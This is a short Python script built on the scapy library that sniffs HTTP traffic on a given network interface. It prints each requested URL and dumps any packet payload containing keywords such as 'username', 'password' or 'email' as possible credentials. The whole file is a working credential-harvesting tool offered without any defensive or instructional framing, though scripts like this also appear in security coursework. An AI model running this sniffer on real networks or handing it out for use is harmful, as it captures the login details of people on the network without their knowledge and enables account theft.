#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', dest='interface', help='Network Interface to sniff on')
	(options) = parser.parse_args()
	return options

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host +	packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = str(packet[scapy.Raw].load).strip('b')
			keywords = ['username','password','user','pass','uname','email','login']
			for keyword in keywords:
				if keyword in load:
					return load
										

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print('[+] HTTP Request >> ' + str(url).strip('b'))

		Log_in_info = get_login_info(packet)
		if Log_in_info:
			print('\n\n[+] Possible username/password > ' + Log_in_info  + '\n\n')

			
options = get_arguments()
sniff(options.interface)